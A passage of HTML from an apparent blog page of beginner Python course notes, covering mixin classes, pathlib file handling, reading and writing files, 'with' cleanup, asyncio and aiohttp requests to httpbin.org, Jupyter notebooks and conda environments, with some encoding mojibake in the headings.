class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Loggable</span>:</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â self.titleÂ =Â <span class="hljs-string">&#x27;&#x27;</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LogÂ messageÂ fromÂ &#x27;</span>Â +Â self.title)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Connection</span>:</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â self.serverÂ =Â <span class="hljs-string">&#x27;&#x27;</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">connect</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ConnectingÂ toÂ databaseÂ onÂ &#x27;</span>Â +Â self.server)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">framework</span>(<span class="hljs-params">item</span>):</span><br><span class="hljs-comment"># Perform the connection</span><br>Â Â Â Â <span class="hljs-keyword">if</span>Â <span class="hljs-built_in">isinstance</span>(item,Â Connection):<br>Â Â Â Â Â Â Â Â item.connect()<br><span class="hljs-comment"># Log the operation</span><br>Â Â Â Â <span class="hljs-keyword">if</span>Â <span class="hljs-built_in">isinstance</span>(item,Â Loggable):<br>Â Â Â Â Â Â Â Â item.log()<br><br><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">SqlDatabase</span>(<span class="hljs-params">Connection,Â Loggable</span>):</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">super</span>().__init__()<br>Â Â Â Â Â Â Â Â self.titleÂ =Â <span class="hljs-string">&#x27;SqlÂ ConnectionÂ Demo&#x27;</span><br>Â Â Â Â Â Â Â Â self.serverÂ =Â <span class="hljs-string">&#x27;Some_Server&#x27;</span><br><br><span class="hljs-comment"># Create an instance of our class</span><br>sql_connectionÂ =Â SqlDatabase()<br><span class="hljs-comment"># Use our framework</span><br>framework(sql_connection) <span class="hljs-comment"># connects and logs</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JustLog</span>(<span class="hljs-params">Loggable</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.title = <span class="hljs-string">&#x27;Just logging&#x27;</span><br>        <br>just_log = JustLog()<br>framework(just_log)<br></code></pre></td></tr></table></figure><h3 id="6ã€Managing-the-file-system"><a href="#6ã€Managing-the-file-system" class="headerlink" title="6ã€Managing the file system"></a>6ã€Managing the file system</h3><p><strong>Managing files</strong></p><ul><li><p>All the common operations are built into Python</p></li><li><p>Static or classless</p><ul><li><code>os.path</code></li><li>Old style</li></ul></li><li><p>Class based</p><ul><li><code>Path</code> from <code>pathlib</code> library</li><li>Python 3.6 or higher</li><li>Better performance as it can avoid calls to the OS</li></ul></li></ul><p><strong>Working with paths</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Python 3.6 or higher</span><br><span class="hljs-comment"># Grab the library</span><br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-comment"># What is the current working directory?</span><br>cwd = Path.cwd()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nCurrent working directory:\n&#x27;</span> + <span class="hljs-built_in">str</span>(cwd))<br><br><span class="hljs-comment"># Create full path name by joining path and filename</span><br>new_file = Path.joinpath(cwd, <span class="hljs-string">&#x27;new_file.txt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nFull path:\n&#x27;</span> + <span class="hljs-built_in">str</span>(new_file))<br><br><span class="hljs-comment"># Check if file exists</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nDoes that file exist? &#x27;</span> + <span class="hljs-built_in">str</span>(new_file.exists()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Working with directories</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br>cwd = Path.cwd()<br><br><span class="hljs-comment"># Get the parent directory</span><br>parent = cwd.parent<br><br><span class="hljs-comment"># Is this a directory?</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nIs this a directory? &#x27;</span> + <span class="hljs-built_in">str</span>(parent.is_dir()))<br><br><span class="hljs-comment"># Is this a file?</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nIs this a file? &#x27;</span> + <span class="hljs-built_in">str</span>(parent.is_file()))<br><br><span class="hljs-comment"># List child directories</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n-----directory contents-----&#x27;</span>)<br><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> parent.iterdir():<br>    <span class="hljs-keyword">if</span> child.is_dir():<br>        <span class="hljs-built_in">print</span>(child)<br></code></pre></td></tr></table></figure><p><strong>Working with files</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br>cwd = Path.cwd()<br><br>demo_file = Path(Path.joinpath(cwd, <span class="hljs-string">&#x27;demo.txt&#x27;</span>))<br><br><span class="hljs-comment"># Get the file name</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile name: &#x27;</span> + demo_file.name)<br><br><span class="hljs-comment"># Get the extension</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile suffix: &#x27;</span> + demo_file.suffix)<br><br><span class="hljs-comment"># Get the folder</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile folder: &#x27;</span> + demo_file.parent.name)<br><br><span class="hljs-comment"># Get the size</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile size: &#x27;</span> + <span class="hljs-built_in">str</span>(demo_file.stat().st_size) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="7ã€Working-with-files"><a href="#7ã€Working-with-files" class="headerlink" title="7ã€Working with files"></a>7ã€Working with files</h3><p><strong>Opening a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">stream = <span class="hljs-built_in">open</span>(file_name, mode, buffer_size)<br><br><span class="hljs-comment"># Modes:</span><br><span class="hljs-comment"># r - Read (default)</span><br><span class="hljs-comment"># w - Truncate and write</span><br><span class="hljs-comment"># a - Append if file exists</span><br><span class="hljs-comment"># x - Write, fail if file exists</span><br><span class="hljs-comment"># + - Updating (read/write)</span><br><br><span class="hljs-comment"># t - Text (default)</span><br><span class="hljs-comment"># b - Binary</span><br></code></pre></td></tr></table></figure><p><strong>Reading from a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open file demo.txt and read the contents</span><br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./demo.txt&#x27;</span>, <span class="hljs-string">&#x27;rt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nIs this readable? &#x27;</span> + <span class="hljs-built_in">str</span>(stream.readable()))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nRead one character : &#x27;</span> + stream.read(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nRead to end of line : &#x27;</span> + stream.readline())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nRead all lines to end of file :\n&#x27;</span> + <span class="hljs-built_in">str</span>(stream.readlines())+ <span class="hljs-string">&#x27;\n&#x27;</span>)<br>stream.close() <span class="hljs-comment"># close the stream</span><br></code></pre></td></tr></table></figure><p><strong>Writing to a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open output.txt as a text file for writing</span><br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nCan I write to this file? &#x27;</span> + <span class="hljs-built_in">str</span>(stream.writable()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>stream.write(<span class="hljs-string">&#x27;H&#x27;</span>) <span class="hljs-comment"># Write a single string </span><br>stream.writelines([<span class="hljs-string">&#x27;ello&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>]) <span class="hljs-comment"># Write one or more strings</span><br>stream.write(<span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># Write a new line</span><br><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>,<span class="hljs-string">&#x27;Christopher&#x27;</span>] <span class="hljs-comment"># create a list of strings</span><br>stream.writelines(names) <span class="hljs-comment"># write list of stringsÂ </span><br><br><span class="hljs-comment"># Here&#x27;s a neat trick to insert a new line between items in the list</span><br>stream.write(<span class="hljs-string">&#x27;\n&#x27;</span>)  <span class="hljs-comment"># Write a new line</span><br>stream.writelines(<span class="hljs-string">&#x27;\n&#x27;</span>.join(names)) <br>stream.close() <span class="hljs-comment"># Flush stream and close</span><br></code></pre></td></tr></table></figure><p><strong>Managing the stream</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open manage.txt file to write text</span><br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;manage.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br><br><span class="hljs-comment"># Write the word demo to the file stream</span><br>stream.write(<span class="hljs-string">&#x27;demo!&#x27;</span>)<br><br><span class="hljs-comment"># Move back to the start of the file stream</span><br>stream.seek(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># write the word cool to the file stream</span><br>stream.write(<span class="hljs-string">&#x27;cool&#x27;</span>)<br><br><span class="hljs-comment"># Flush the file stream contents to the file buffer</span><br>stream.flush()<br><br><span class="hljs-comment"># Flush the file stream and close the file</span><br>stream.close()<br></code></pre></td></tr></table></figure><h3 id="8ã€Cleanup-with-with"><a href="#8ã€Cleanup-with-with" class="headerlink" title="8ã€Cleanup with with"></a>8ã€Cleanup with with</h3><p><strong>Writing to a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br>stream.write(<span class="hljs-string">&#x27;Lorem ipsum dolar&#x27;</span>)<br>stream.close() <span class="hljs-comment"># THIS IS REALLY IMPORTANT!!</span><br></code></pre></td></tr></table></figure><p><strong>Re-writing with a try/finally</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br>stream.write(<span class="hljs-string">&#x27;Lorem ipsum dolar&#x27;</span>)<br><span class="hljs-keyword">finally</span>:<br>stream.close() <span class="hljs-comment"># THIS IS REALLY IMPORTANT!!</span><br></code></pre></td></tr></table></figure><p><strong>Simplifying with with</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>) <span class="hljs-keyword">as</span> stream:<br>stream.write(<span class="hljs-string">&#x27;Lorem ipsum dolar&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="9ã€Asynchronous-operations"><a href="#9ã€Asynchronous-operations" class="headerlink" title="9ã€Asynchronous operations"></a>9ã€Asynchronous operations</h3><p><strong>The waiting is the hardest part</strong></p><ul><li><p>Some operations take a long time</p><ul><li>Web calls</li><li>Network IO</li><li>Complex data processing</li></ul></li><li><p>We donâ€™t want to stop everything just because one process is taking forever</p></li></ul><p><strong>Concurrency and parellelism is a broad topic</strong></p><ul><li><p>All languages offer multiple options for managing long running operations, Python is no exception</p></li><li><p>Weâ€™re going to focus on a common scenario - web requests</p></li></ul><p><strong>Synchronous using requests</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><br>start_timeÂ =Â default_timer()<br>three = requests.get(<span class="hljs-string">&#x27;https://httpbin.org/delay/3&#x27;</span>).text<br>two = requests.get(<span class="hljs-string">&#x27;https://httpbin.org/delay/2&#x27;</span>).text<br>elapsed_time = default_timer() - start_time<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;TheÂ operationÂ tookÂ <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span>Â seconds&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Introducing the asyncio module</strong></p><ul><li><p>New in Python 3.4</p><ul><li>Undergoing regular updates</li></ul></li><li><p>â€œGraftsâ€ asynchronous development into Python</p><ul><li>Streams</li><li>async/await</li><li>Synchronization (locks)</li><li>Exception management</li></ul></li></ul><p><strong>Enabling async with asyncio</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Operations<br>run <span class="hljs-comment"># Runtime for asynchronous functions</span><br>create_task <span class="hljs-comment"># Creates a handle (or coroutine) and schedules execution</span><br>gather <span class="hljs-comment"># Create a collection of tasks to execute and wait for completion</span><br>Creating coroutines (functions using <span class="hljs-keyword">async</span>/<span class="hljs-keyword">await</span>)<br><span class="hljs-keyword">async</span> <span class="hljs-comment"># Flag to create a coroutine (function with an await call)</span><br><span class="hljs-keyword">await</span> <span class="hljs-comment"># &quot;Pauses&quot; code to wait for response</span><br></code></pre></td></tr></table></figure><p><strong>Running our aiohttp demo</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">async</span>Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">main</span>():</span><br>Â Â Â  start_timeÂ =Â default_timer()<br><br>Â Â Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-keyword">with</span>Â aiohttp.ClientSession()Â <span class="hljs-keyword">as</span>Â session:<br>Â Â Â Â Â Â Â Â two_taskÂ =Â asyncio.create_task(load_data(session,Â <span class="hljs-number">2</span>))<br>Â Â Â Â Â Â Â Â three_taskÂ =Â asyncio.create_task(load_data(session,Â <span class="hljs-number">3</span>))<br><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DoingÂ otherÂ work&#x27;</span>)<br>Â Â Â Â Â Â Â Â two_resultÂ =Â <span class="hljs-keyword">await</span>Â two_task<br>Â Â Â Â Â Â Â Â three_resultÂ =Â <span class="hljs-keyword">await</span>Â three_task<br><br>Â Â Â Â Â Â Â Â elapsed_timeÂ =Â default_timer()Â -Â start_time<br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;TheÂ operationÂ tookÂ <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span>Â seconds&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Asynchronous using aiohttp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># install aiohttp</span><br><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><br><span class="hljs-keyword">async</span>Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">load_data</span>(<span class="hljs-params">session,Â delay</span>):</span><br>Â Â Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-keyword">with</span>Â session.get(<span class="hljs-string">f&#x27;https://httpbin.org/delay/<span class="hljs-subst">&#123;delay&#125;</span>&#x27;</span>)Â <span class="hljs-keyword">as</span>Â resp:<br>Â Â Â Â Â Â Â Â <span class="hljs-keyword">await</span>Â resp.text()<br></code></pre></td></tr></table></figure><p><strong>sync_demo.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_data</span>(<span class="hljs-params">delay</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Starting <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br>    text = requests.get(<span class="hljs-string">f&#x27;http://httpbin.org/delay/<span class="hljs-subst">&#123;delay&#125;</span>&#x27;</span>).text<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Completed <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    start_time = default_timer()<br><br>    two_data = load_data(<span class="hljs-number">2</span>)<br>    three_data = load_data(<span class="hljs-number">3</span>)<br><br>    elapsed_time = default_timer() - start_time<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;The operation took <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span> seconds&#x27;</span>)<br><br>main()<br></code></pre></td></tr></table></figure><p><strong>async_demo.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Will only run in Python 3.7 or higher</span><br><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_data</span>(<span class="hljs-params">session, delay</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Starting <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">f&#x27;http://httpbin.org/delay/<span class="hljs-subst">&#123;delay&#125;</span>&#x27;</span>) <span class="hljs-keyword">as</span> resp:<br>        text = <span class="hljs-keyword">await</span> resp.text()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Completed <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br>        <span class="hljs-keyword">return</span> text<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># Start the timer</span><br>    start_time = default_timer()<br><br>    <span class="hljs-comment"># Creating a single session</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># Setup our tasks and get them running</span><br>        two_task = asyncio.create_task(load_data(session, <span class="hljs-number">2</span>))<br>        three_task = asyncio.create_task(load_data(session, <span class="hljs-number">3</span>))<br><br>        <span class="hljs-comment"># Simulate other processing</span><br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Doing other work&#x27;</span>)<br><br>        <span class="hljs-comment"># Let&#x27;s go get our values</span><br>        two_result = <span class="hljs-keyword">await</span> two_task<br>        three_result = <span class="hljs-keyword">await</span> three_task<br><br>        <span class="hljs-comment"># Print our results</span><br>        elapsed_time = default_timer() - start_time<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;The operation took <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span> seconds&#x27;</span>)<br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€Even-more-python-for-beginners"><a href="#ä¸‰ã€Even-more-python-for-beginners" class="headerlink" title="ä¸‰ã€Even more python for beginners"></a>ä¸‰ã€Even more python for beginners</h2><h3 id="1ã€Jupyter-Notebooks"><a href="#1ã€Jupyter-Notebooks" class="headerlink" title="1ã€Jupyter Notebooks"></a>1ã€Jupyter Notebooks</h3><p><strong>What are Jupyter notebooks</strong></p><ul><li><p>Open source software</p></li><li><p>Interactive development environment</p></li><li><p>Run inside JupyterLab on your laptop or in the cloud</p></li><li><p>Download JupyterLab from <a href="https://jupyter.org/">jupyter.org</a></p></li></ul><p><strong>Create a notebook to execute your code</strong> </p><p>Select New | Notebook: Python from the upper right hand corner of the toolbar to create a new notebook to execute Python code </p><p><strong>You can upload existing notebooks</strong> </p><p>Select Upload from the top right corner of the toolbar to upload an existing notebook  </p><p><strong>Each notebook has one or more cells</strong> </p><ul><li><p>Use the toolbar to add and move cells </p></li><li><p>When you add a cell select a cell type </p><ul><li>Code â€“ contain the code to execute </li><li>Markdown â€“ Contains descriptive text formatted using Markdown syntax </li><li>Raw NB Convert â€“ is formatted as code but cannot be executed</li></ul></li></ul><p><strong>You can execute your code one cell at a time</strong></p><ul><li><p>Select <strong>Run</strong> from the toolbar to run the code in the current cell</p></li><li><p>Or you can use keyboard shortcuts</p><ul><li><code>CTRL + ENTER</code> runs the code in the current cell</li><li><code>SHIFT + ENTER</code> runs the code in the current cell and moves to the next cell</li></ul></li></ul><p><strong>When you run your code the output appears</strong></p><ul><li>Output appears below the code cell</li><li>If the last line of code in a cell is the name of a variable, Jupyter will display the contents of the variable</li></ul><p><strong>Variables are in scope for the entire notebook</strong></p><ul><li>If you run code in a cell that declares a variable or imports a library, subsequent cells you execute can access that variable or library</li><li>Select restart the kernel from the toolbar to reset the notebook and start executing code in a notebook over from scratch</li></ul><h3 id="2ã€Anaconda-and-conda"><a href="#2ã€Anaconda-and-conda" class="headerlink" title="2ã€Anaconda and conda"></a>2ã€Anaconda and conda</h3><p><strong>Anaconda is an open source distribution of Python and R for data science</strong></p><p>includes:</p><ul><li><p>more than 1500 packages </p></li><li><p>a graphical interface called Anaconda Navigator</p></li><li><p>a command line interface called Anaconda prompt</p></li><li><p>a tool called <strong>conda</strong></p></li></ul><p><strong>conda is a tool to create and manage python environments</strong></p><p>As you get into more advanced Python coding you will need to install different packages</p><p>When working with tools such as Jupyter notebooks, <a href="https://docs.conda.io/projects/conda/en/latest/index.html">conda</a> may be the simplest way to install libraries so they can be accessed from your notebooks</p><p><strong>After you install Anaconda launch the prompt</strong></p><p><strong>Create a virtual environment with conda</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> conda create --name my_notebook_env python=3.7 â€“y</span><br><br>--name my_notebook_env: the name of the environment<br>python=3.7: version of python in the environment<br>â€“y: responds yes automatically to prompts<br></code></pre></td></tr></table></figure><p><strong>Activate your virtual environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> conda activate my_notebook_env</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> conda deactivate</span>Â <br>will deactivate the current active environment<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> conda remove --name my_notebook_env --all</span><br>will permanently delete the virtualÂ environment<br></code></pre></td></tr></table></figure><p><strong>Install library in the active environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 